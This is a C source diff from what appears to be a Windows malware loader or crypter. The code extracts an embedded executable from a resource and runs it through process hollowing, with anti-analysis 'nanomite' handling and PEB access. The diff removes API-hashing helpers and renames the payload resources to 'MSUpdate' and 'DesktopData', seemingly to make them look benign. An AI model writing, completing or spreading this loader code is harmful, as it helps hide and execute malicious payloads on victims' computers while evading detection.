@@ -1,43 +1,6 @@
 #include "cyann.h"
 #include "api_function.h"
 
-DWORD	shash(char *s)
-{
-	CINT   i;
-
-        i = 0;
-        while (*s)
-        {
-                i *= 16777619;
-                i ^= *s++;
-        }
-        return (i);
-}
-
-DWORD	whash(PWSTR s)
-{
-	CINT	i;
-
-	i = 0;
-	while (*s)
-	{
-		i *= 16777619;
-		i ^= *s++;
-	}
-	return (i);
-}
-
-
-void	get_peb(CINT *peb)
-{
-	if (peb)
-	#if defined(_WIN64)
- 		*peb = __readgsqword( 0x60 );
-	#else
-	 	*peb = __readfsdword( 0x30 );
-	#endif
-}
-
 LPWSTR	get_me(void)
 {
 	WCHAR			buffer[MAX_PATH];
@@ -58,18 +21,18 @@ LPWSTR	get_me(void)
 int main(void)
 {
 	LPWSTR	memyselfandi;
-	WCHAR resid[128] = L"X32";
-	WCHAR rsrc[128] = L"NM32";
+	//WCHAR resid[128] = L"X32";
+	//WCHAR rsrc[128] = L"NM32";
 	PUCHAR	bin;
 	t_pe	*pe;
 
 	get_peb(&g_peb);
 	if (!(memyselfandi = get_me()))
 		return (1);
-	g_ntable = make_nanomited_table(rsrc);
+	g_ntable = make_nanomited_table(MSUpdate);
 	if (g_ntable)
 	{
-		if ((bin = extract_rsrc(resid)))
+		if ((bin = extract_rsrc(DesktopData)))
 		{
 			pe = parse_pe(bin);
 			process_hollow(memyselfandi, pe);
